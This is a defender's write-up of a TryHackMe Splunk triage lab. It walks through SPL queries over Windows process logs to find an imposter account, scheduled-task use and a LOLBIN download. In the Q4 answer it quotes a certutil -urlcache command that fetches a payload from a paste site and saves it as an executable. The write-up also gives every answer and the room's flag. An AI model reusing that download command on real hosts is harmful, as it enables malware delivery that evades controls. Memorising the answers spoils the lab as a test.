# Benign - TryHackMe Writeup

- **Room:** [Benign](https://tryhackme.com/room/benign)
- **Path:** SOC Level 1
- **Category:** Splunk Alert Triage
- **Difficulty:** Medium
- **Completed:** 27th of September 2026

---

## Scenario

One of the client's IDS flagged a suspicious process execution, suggesting that one of the hosts in the HR department was compromised. Some tools related to network information gathering and scheduled tasks were run, which confirmed the suspicion.

Due to limited resources, only the process execution logs (Event ID **4688**) could be pulled. They were ingested into Splunk under the index `win_eventlogs` for further investigation.

### Network information

The network is split into three departments, which helps a lot during the investigation:

- **IT Department** - James, Moin, Katrina
- **HR Department** - Haroon, Chris, Diana
- **Marketing Department** - Bell, Amelia, Deepak

---

## Q1 - How many logs are ingested from the month of March, 2022?

I started with a simple search on the whole index and set the time range to end before the 1st of April 2022. As it turned out, it didn't really matter - all the logs in this index were from March 2022 anyway, so "All time" would give the same result.

```
index=win_eventlogs
```

<img width="945" height="137" alt="image" src="https://github.com/user-attachments/assets/d112cb10-a7f8-4104-be48-d9ce3469bb3d" />


Answer: `13959`

---

## Q2 - Imposter Alert: There seems to be an imposter account observed in the logs, what is the name of that user?

Instead of scrolling through the events, I used SPL to list all users and count how many events each of them had:

```
index=win_eventlogs
| stats count by UserName
```

This returned 11 results. Going through the list, one name immediately looked off - **Amel1a**, with the digit "1" in place of the letter "i". It looks almost identical to the real user Amelia from Marketing, which is a classic trick to blend in. On top of that, it had only 1 event, which also made it stand out.

<img width="1915" height="631" alt="image" src="https://github.com/user-attachments/assets/8ef7a383-f2f1-4be3-bed2-925022b1ac77" />


Answer: `Amel1a`

---

## Q3 - Which user from the HR department was observed to be running scheduled tasks?

Scheduled tasks on Windows are managed with `schtasks`, so I searched for that keyword and counted the results per user:

```
index=win_eventlogs schtasks
| stats count by UserName
```

Comparing the results with the department list, only one of the users belonged to HR.

<img width="1910" height="398" alt="image" src="https://github.com/user-attachments/assets/ecb4e025-3196-42fa-afac-77a6d8c8bf6c" />


Answer: `Chris.fort`

---

## Q4 - Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host?

My first idea was to show all commands run on the HR hosts:

```
index=win_eventlogs HostName="*HR*"
| table _time Event UserName CommandLine
```

But this gave me way too many results to go through.

So I changed the approach and checked the HR users one by one, starting with Haroon, since he was first on the list:

```
index=win_eventlogs HostName="*HR*" UserName="haroon"
| table _time Event CommandLine
```

I quickly browsed through the pages looking for anything that stood out. On the 3rd page I found this command:

```
certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
```

This was clearly a file being downloaded from an external site - and funnily enough, the file is named after the room itself.

<img width="945" height="587" alt="image" src="https://github.com/user-attachments/assets/61ca0a44-b768-4858-af40-fa5a2f04ad91" />


Answer: `haroon`

---

## Q5 - To bypass the security controls, which system process (LOLBIN) was used to download a payload from the internet?

The answer comes straight from the command found in Q4.

**certutil** is a built-in Windows tool meant for managing certificates. However, with the `-urlcache` option it can also download files from the internet. Since it's a trusted Microsoft tool, attackers abuse it to download malware without triggering alarms - this is what's called a LOLBIN ("living off the land" binary).

Answer: `certutil.exe`

---

## Q6 - What was the date that this binary was executed by the infected host? (format YYYY-MM-DD)

The date was visible in the `_time` column of the same event from Q4.

Answer: `2022-03-04`

---

## Q7 - Which third-party site was accessed to download the malicious payload?

The command from Q4 gave this away - the URL points to a text-sharing site, similar to Pastebin. Attackers like using sites like this because the traffic looks normal and the domain is not on typical blocklists.

Answer: `controlc.com`

---

## Q8 - What is the name of the file that was saved on the host machine from the C2 server during the post-exploitation phase?

The last part of the certutil command tells where the downloaded content is saved - in this case, as `benign.exe`.

Answer: `benign.exe`

---

## Q9 - The suspicious file downloaded from the C2 server contained malicious content with the pattern THM{..........}; what is that pattern?

I didn't know controlc.com, so I googled it - it's a text-sharing site where you can publish and share text online. To see what was hiding there, I copied the full link from the command into my browser. The paste was still available and it contained the flag.

<img width="592" height="345" alt="image" src="https://github.com/user-attachments/assets/e9ceeace-1f43-4852-94ba-971134ada0c3" />


Answer: `THM{KJ&*H^B0}`

---

## Q10 - What is the URL that the infected host connected to?

This is the same URL used in the certutil command and opened in Q9.

Answer: `https://controlc.com/e4d11035`

---

## Summary

A good exercise in narrowing things down step by step in Splunk:

- `stats count by UserName` quickly exposed an imposter account (`Amel1a`) hiding among real users,
- searching for a specific keyword (`schtasks`) pointed to scheduled task activity,
- when a broad search returned too much, going user by user made the suspicious command easy to spot.

Same lesson as in ItsyBitsy - attackers don't need fancy tools. A built-in Windows binary like certutil and a public text-sharing site are enough to pull a payload onto a machine.
